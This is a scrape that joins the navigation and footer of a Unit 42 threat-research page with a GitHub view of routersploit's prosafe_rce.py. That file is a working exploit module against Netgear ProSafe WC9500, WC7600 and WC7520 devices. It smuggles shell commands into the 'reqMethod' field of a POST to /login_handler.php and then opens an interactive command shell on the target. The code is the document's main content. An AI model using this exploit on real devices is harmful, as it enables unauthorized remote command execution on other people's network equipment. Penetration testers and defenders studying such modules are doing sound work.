* [Zero Trust Network Access](https://www.paloaltonetworks.com/sase/ztna "Zero Trust Network Access")

* [Code to Cloud Platform](https://www.paloaltonetworks.com/prisma/whyprisma "Code to Cloud Platform")
* [Prisma Cloud](https://www.paloaltonetworks.com/prisma/cloud "Prisma Cloud")
* [Cloud-Native Application Protection Platform](https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform "Cloud-Native Application Protection Platform")

* [AI-Driven Security Operations Platform](https://www.paloaltonetworks.com/cortex "AI-Driven Security Operations Platform")
* [Cortex XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr "Cortex XDR")
* [Cortex XSOAR](https://www.paloaltonetworks.com/cortex/cortex-xsoar "Cortex XSOAR")
* [Cortex Xpanse](https://www.paloaltonetworks.com/cortex/cortex-xpanse "Cortex Xpanse")
* [Cortex XSIAM](https://www.paloaltonetworks.com/cortex/cortex-xsiam "Cortex XSIAM")
* [External Attack Surface Protection](https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management "External Attack Surface Protection")
* [Security Automation](https://www.paloaltonetworks.com/cortex/security-operations-automation "Security Automation")
* [Threat Prevention, Detection & Response](https://www.paloaltonetworks.com/cortex/detection-and-response "Threat Prevention, Detection & Response")

* [Threat Intel and Incident Response Services](https://www.paloaltonetworks.com/unit42 "Threat Intel and Incident Response Services")
* [Proactive Assessments](https://www.paloaltonetworks.com/unit42/assess "Proactive Assessments")
* [Incident Response](https://www.paloaltonetworks.com/unit42/respond "Incident Response")
* [Transform Your Security Strategy](https://www.paloaltonetworks.com/unit42/transform "Transform Your Security Strategy")
* [Discover Threat Intelligence](https://www.paloaltonetworks.com/unit42/threat-intelligence-partners "Discover Threat Intelligence")

### Company

* [About Us](https://www.paloaltonetworks.com/about-us "About Us")
* [Careers](https://jobs.paloaltonetworks.com/en/ "Careers")
* [Contact Us](https://www.paloaltonetworks.com/company/contact-sales "Contact Us")
* [Corporate Responsibility](https://www.paloaltonetworks.com/about-us/corporate-responsibility "Corporate Responsibility")
* [Customers](https://www.paloaltonetworks.com/customers "Customers")
* [Investor Relations](https://investors.paloaltonetworks.com/ "Investor Relations")
* [Location](https://www.paloaltonetworks.com/about-us/locations "Location")
* [Newsroom](https://www.paloaltonetworks.com/company/newsroom "Newsroom")

### Popular links

* [Blog](https://www.paloaltonetworks.com/blog/ "Blog")
* [Communities](https://www.paloaltonetworks.com/communities "Communities")
* [Content Library](https://www.paloaltonetworks.com/resources "Content Library")
* [Cyberpedia](https://www.paloaltonetworks.com/cyberpedia "Cyberpedia")
* [Event Center](https://events.paloaltonetworks.com/ "Event Center")
* [Manage Email Preferences](https://start.paloaltonetworks.com/preference-center "Manage Email Preferences")
* [Products A-Z](https://www.paloaltonetworks.com/products/products-a-z "Products A-Z")
* [Product Certifications](https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs "Product Certifications")
* [Report a Vulnerability](https://www.paloaltonetworks.com/security-disclosure "Report a Vulnerability")
* [Sitemap](https://www.paloaltonetworks.com/sitemap "Sitemap")
* [Tech Docs](https://docs.paloaltonetworks.com/ "Tech Docs")
* [Unit 42](https://unit42.paloaltonetworks.com/ "Unit 42")
* [Do Not Sell or Share My Personal Information](https://panwedd.exterro.net/portal/dsar.htm?target=panwedd "Do Not Sell or Share My Personal Information")

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg)](https://www.paloaltonetworks.com/ "Footer Nav")

* [Privacy](https://www.paloaltonetworks.com/legal-notices/privacy "Privacy")
* [Trust Center](https://www.paloaltonetworks.com/legal-notices/trust-center "Trust Center")
* [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use "Terms of Use")
* [Documents](https://www.paloaltonetworks.com/legal "Documents")

Copyright © 2025 Palo Alto Networks. All Rights Reserved

* [![YouTube]()](https://www.youtube.com/user/paloaltonetworks "YouTube")
* [![Twitter]()](https://twitter.com/Unit42_Intel "X")
* [![Facebook]()](https://www.facebook.com/PaloAltoNetworks/ "Facebook")
* [![LinkedIn]()](https://www.linkedin.com/company/palo-alto-networks "LinkedIn")
* [![Podcast]()](https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/ "Podcast")

![Globe icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg)
EN
![Down arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg)

* Select your language
* [USA (ENGLISH)](https://unit42.paloaltonetworks.com/new-mirai-variant-targets-enterprise-wireless-presentation-display-systems/)
* [JAPAN (日本語)](https://unit42.paloaltonetworks.jp/new-mirai-variant-targets-enterprise-wireless-presentation-display-systems/)

![Play](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg)
![Pause](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg)

![Minimize](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg)

![Close button](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg)

Your browser does not support the video tag.

### Default Heading

Read the article
![Right Arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg)

Seekbar

![Play](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg)
![Pause](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg)

![Volume](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg)

Volume

![Minimize](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg)



=== Content from github.com_5bb00394_20250125_162930.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthreat9%2Froutersploit%2Fblob%2Fmaster%2Froutersploit%2Fmodules%2Fexploits%2Frouters%2Fnetgear%2Fprosafe_rce.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthreat9%2Froutersploit%2Fblob%2Fmaster%2Froutersploit%2Fmodules%2Fexploits%2Frouters%2Fnetgear%2Fprosafe_rce.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=threat9%2Froutersploit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[threat9](/threat9)
/
**[routersploit](/threat9/routersploit)**
Public

* [Notifications](/login?return_to=%2Fthreat9%2Froutersploit) You must be signed in to change notification settings
* [Fork
  2.3k](/login?return_to=%2Fthreat9%2Froutersploit)
* [Star
   12.3k](/login?return_to=%2Fthreat9%2Froutersploit)

* [Code](/threat9/routersploit)
* [Issues
  70](/threat9/routersploit/issues)
* [Pull requests
  2](/threat9/routersploit/pulls)
* [Actions](/threat9/routersploit/actions)
* [Wiki](/threat9/routersploit/wiki)
* [Security](/threat9/routersploit/security)
* [Insights](/threat9/routersploit/pulse)

Additional navigation options

* [Code](/threat9/routersploit)
* [Issues](/threat9/routersploit/issues)
* [Pull requests](/threat9/routersploit/pulls)
* [Actions](/threat9/routersploit/actions)
* [Wiki](/threat9/routersploit/wiki)
* [Security](/threat9/routersploit/security)
* [Insights](/threat9/routersploit/pulse)

## Files

 master
## Breadcrumbs

1. [routersploit](/threat9/routersploit/tree/master)
2. /[routersploit](/threat9/routersploit/tree/master/routersploit)
3. /[modules](/threat9/routersploit/tree/master/routersploit/modules)
4. /[exploits](/threat9/routersploit/tree/master/routersploit/modules/exploits)
5. /[routers](/threat9/routersploit/tree/master/routersploit/modules/exploits/routers)
6. /[netgear](/threat9/routersploit/tree/master/routersploit/modules/exploits/routers/netgear)
/
# prosafe\_rce.py

Copy path Blame  Blame
## Latest commit

## History

[History](/threat9/routersploit/commits/master/routersploit/modules/exploits/routers/netgear/prosafe_rce.py)71 lines (57 loc) · 2.23 KB master
## Breadcrumbs

1. [routersploit](/threat9/routersploit/tree/master)
2. /[routersploit](/threat9/routersploit/tree/master/routersploit)
3. /[modules](/threat9/routersploit/tree/master/routersploit/modules)
4. /[exploits](/threat9/routersploit/tree/master/routersploit/modules/exploits)
5. /[routers](/threat9/routersploit/tree/master/routersploit/modules/exploits/routers)
6. /[netgear](/threat9/routersploit/tree/master/routersploit/modules/exploits/routers/netgear)
/
# prosafe\_rce.py

Top
## File metadata and controls

* Code
* Blame

71 lines (57 loc) · 2.23 KB[Raw](https://github.com/threat9/routersploit/raw/refs/heads/master/routersploit/modules/exploits/routers/netgear/prosafe_rce.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import refrom routersploit.core.exploit import \*from routersploit.core.http.http\_client import HTTPClient
class Exploit(HTTPClient): \_\_info\_\_ = { "name": "Netgear ProSafe RCE", "description": "Module exploits remote command execution vulnerability in Netgear ProSafe " "WC9500, WC7600, WC7520 devices. If the target is vulnerable command shell is invoked.", "authors": ( "Andrei Costin <andrei[at]firmware.re>", # vulnerability discovery "Marcin Bury <marcin[at]threat9.com>", # routersploit module ), "references": ( "http://firmware.re/vulns/acsa-2015-002.php", "https://www.blackhat.com/docs/asia-16/materials/asia-16-Costin-Automated-Dynamic-Firmware-Analysis-At-Scale-A-Case-Study-On-Embedded-Web-Interfaces.pdf", ), "devices": ( "Netgear ProSafe WC9500", "Netgear ProSafe WC7600", "Netgear ProSafe WC7520", ) }
 target = OptIP("", "Target IPv4 or IPv6 address") port = OptPort(80, "Target HTTP port")
 def run(self): if self.check(): print\_success("Target is vulnerable") print\_status("Invoking command loop...") shell(self) else: print\_error("Target is not vulnerable")
 def execute(self, cmd): mark = utils.random\_text(32) headers = {'Content-Type': 'application/x-www-form-urlencoded'} data = 'reqMethod=json\_cli\_reqMethod" "json\_cli\_jsonData";{}; echo {}'.format(cmd, mark)
 response = self.http\_request( method="POST", path="/login\_handler.php", headers=headers, data=data )
 if response is None: return ""
 if mark in response.text: regexp = "(|.+?){}".format(mark) res = re.findall(regexp, response.text, re.DOTALL)
 if len(res): return res[0]
 return ""
 @mute def check(self): mark = utils.random\_text(32) cmd = "echo {}".format(mark)
 response = self.execute(cmd)
 if mark in response: return True # target is vulnerable
 return False # target is not vulnerable

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


